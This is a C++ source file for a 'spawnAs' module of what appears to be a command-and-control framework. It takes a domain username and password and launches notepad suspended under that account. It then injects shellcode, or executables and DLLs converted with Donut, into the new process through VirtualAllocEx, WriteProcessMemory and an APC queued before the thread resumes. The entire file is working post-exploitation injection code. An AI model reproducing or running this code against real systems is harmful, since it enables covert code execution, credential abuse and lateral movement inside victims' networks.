#include "SpawnAs.hpp"

#include <cstring>

#include "Tools.hpp"
#include "Common.hpp"

#ifdef __linux__

#elif _WIN32
#include <windows.h>
#include <stdio.h>
#include <userenv.h>
#endif

using namespace std;

#ifdef __linux__

#elif _WIN32

#endif

const std::string moduleName = "spawnAs";


#ifdef _WIN32

__declspec(dllexport) SpawnAs* A_SpawnAsConstructor() 
{
    return new SpawnAs();
}

#endif

SpawnAs::SpawnAs()
	: ModuleCmd(moduleName)
{
}

SpawnAs::~SpawnAs()
{
}

std::string SpawnAs::getInfo()
{
	std::string info;
	info += "spawnAs:\n";
	info += "Inject shellcode inside a process launch as another user. \n";
	info += "exemple:\n";
	info += "- spawnAs DOMAIN\\Username Password -r ./shellcode.bin\n";
    info += "- spawnAs .\\Administrator Password -e ./program.exe arg1 arg2...\n";
    info += "- spawnAs .\\Administrator Password -d ./test.dll method arg1 arg2...\n";

	return info;
}

int SpawnAs::init(std::vector<std::string> &splitedCmd, C2Message &c2Message)
{
    if (splitedCmd.size() >= 5)
	{
        // format DOMAIN\Username Password
        string usernameDomain="";
        string password="";
        std::string username="";
        std::string domain=".";
        if(splitedCmd.size()>=3)
        {
            usernameDomain = splitedCmd[1];
            password = splitedCmd[2];
        }

        std::vector<std::string> splitedList;
        splitList(usernameDomain, "\\", splitedList);

        if(splitedList.size()==1)
        username = splitedList[0];
        else if(splitedList.size()>1)
        {
            domain = splitedList[0];
            username = splitedList[1];
        }

        std::string cmd = domain;
        cmd += ";";
        cmd += username;
        cmd += ";";
        cmd += password;

		bool donut=false;
		std::string inputFile=splitedCmd[4];
		std::string method;
		std::string args;
		int pid=-1;

		if(splitedCmd[3]=="-e")
		{
			donut=true;
			for (int idx = 5; idx < splitedCmd.size(); idx++) 
			{
				if(!args.empty())
					args+=" ";
				args+=splitedCmd[idx];
			}
		}
		else if(splitedCmd[3]=="-d")
		{
			donut=true;
			if(splitedCmd.size() > 5)
				method=splitedCmd[5];
			else
			{
				std::string msg = "Method is mandatory for DLL.\n";
				c2Message.set_returnvalue(msg);
				return -1;
			}
			for (int idx = 6; idx < splitedCmd.size(); idx++) 
			{
				if(!args.empty())
					args+=" ";
				args+=splitedCmd[idx];
			}
		}
		else if(splitedCmd[3]=="-r")
		{
		}
		else
		{
			std::string msg = "One of the tags, -r, -e or -d must be provided.\n";
			c2Message.set_returnvalue(msg);
			return -1;
		}

		if(inputFile.empty())
		{
			std::string msg = "A file name have to be provided.\n";
			c2Message.set_returnvalue(msg);
			return -1;
		}

		std::ifstream myfile;
		myfile.open(inputFile);
		if(!myfile) 
		{
			std::string msg = "Couldn't open file.\n";
			c2Message.set_returnvalue(msg);
			return -1;
		}
		myfile.close();

		std::string payload;
		if(donut)
		// in unicode ????
			creatShellCodeDonut(inputFile, method, args, payload);
		else
		{
			std::ifstream input(inputFile, std::ios::binary);
			std::string payload_(std::istreambuf_iterator<char>(input), {});
			payload=payload_;
		}

		if(payload.size()==0)
		{
			std::string msg = "Something went wrong. Payload empty.\n";
			c2Message.set_returnvalue(msg);
			return -1;
		}

        c2Message.set_instruction(m_name);
        c2Message.set_cmd(cmd);
		c2Message.set_pid(pid);
		c2Message.set_inputfile(inputFile);
		c2Message.set_data(payload.data(), payload.size());
	}
	else
	{
		c2Message.set_returnvalue(getInfo());
		return -1;
	}

	return 0;
}


int SpawnAs::process(C2Message &c2Message, C2Message &c2RetMessage)
{
	const std::string cmd = c2Message.cmd();

    std::vector<std::string> splitedList;
    splitList(cmd, ";", splitedList);

    std::string domain=splitedList[0];
    std::string username=splitedList[1];
    std::string password=splitedList[2];

    const std::string payload = c2Message.data();

    // std::string out = spawn(username, domain, password);

    std::string result;

#ifdef __linux__ 

    result += "SpawnAs don't work in linux.\n";

#elif _WIN32

    DWORD dwSize;
    HANDLE hToken;
    LPVOID lpvEnv;
    PROCESS_INFORMATION piProcInfo = {0};
    STARTUPINFOW si = {0};
    CHAR szUserProfile[256] = "";
    si.cb = sizeof(STARTUPINFOW);

    if (!LogonUser(username.c_str(), domain.c_str(), password.c_str(), LOGON32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT, &hToken))
    {
        result += "Unable to LogonUser.\n";
        c2RetMessage.set_instruction(m_name);
        c2RetMessage.set_cmd(cmd);
        c2RetMessage.set_returnvalue(result);
        return 0;
    }

    wchar_t szCmdline[] = TEXT(L"notepad");

    std::wstring usernameW = std::wstring(username.begin(), username.end());
    std::wstring domainW = std::wstring(domain.begin(), domain.end());
    std::wstring passwordW = std::wstring(password.begin(), password.end());
    if (!CreateProcessWithLogonW(usernameW.c_str(), domainW.c_str(), passwordW.c_str(), LOGON_WITH_PROFILE, 
        NULL, 
        szCmdline, 
        CREATE_SUSPENDED, 
        NULL, 
        NULL, 
        &si, 
        &piProcInfo))
    {
        result += "Unable to CreateProcessWithLogonW.\n";
        c2RetMessage.set_instruction(m_name);
        c2RetMessage.set_cmd(cmd);
        c2RetMessage.set_returnvalue(result);
        return 0;
    }

    PVOID remoteBuffer = VirtualAllocEx(piProcInfo.hProcess, NULL, payload.size(), (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);
	WriteProcessMemory(piProcInfo.hProcess, remoteBuffer, payload.data(), payload.size(), NULL);
	DWORD oldprotect = 0;
	VirtualProtectEx(piProcInfo.hProcess, remoteBuffer, payload.size(), PAGE_EXECUTE_READ, &oldprotect);
	PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)remoteBuffer;
	QueueUserAPC((PAPCFUNC)apcRoutine, piProcInfo.hThread, NULL);
	ResumeThread(piProcInfo.hThread);

    CloseHandle(hToken);
    CloseHandle(piProcInfo.hProcess);
    CloseHandle(piProcInfo.hThread);

#endif

	c2RetMessage.set_instruction(m_name);
	c2RetMessage.set_cmd(cmd);
	c2RetMessage.set_returnvalue(result);
	return 0;
}


std::string SpawnAs::spawn(const std::string& username, const std::string& domain, const std::string& password)
{
	std::string result;

#ifdef __linux__ 

    result += "SpawnAs don't work in linux.\n";

#elif _WIN32

    DWORD dwSize;
    HANDLE hToken;
    LPVOID lpvEnv;
    PROCESS_INFORMATION pi = {0};
    STARTUPINFOW si = {0};
    CHAR szUserProfile[256] = "";
    si.cb = sizeof(STARTUPINFOW);

    if (!LogonUser(username.c_str(), domain.c_str(), password.c_str(), LOGON32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT, &hToken))
    {
        result += "Unable to LogonUser.\n";
        return result;
    }

    wchar_t szCmdline[] = TEXT(L"notepad");

    std::wstring usernameW = std::wstring(username.begin(), username.end());
    std::wstring domainW = std::wstring(domain.begin(), domain.end());
    std::wstring passwordW = std::wstring(password.begin(), password.end());
    if (!CreateProcessWithLogonW(usernameW.c_str(), domainW.c_str(), passwordW.c_str(), LOGON_WITH_PROFILE, 
        NULL, 
        szCmdline, 
        CREATE_SUSPENDED, 
        NULL, 
        NULL, 
        &si, 
        &pi))
    {
        result += "Unable to CreateProcessWithLogonW.\n";
        return result;
    }

    CloseHandle(hToken);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

#endif

	return result;
}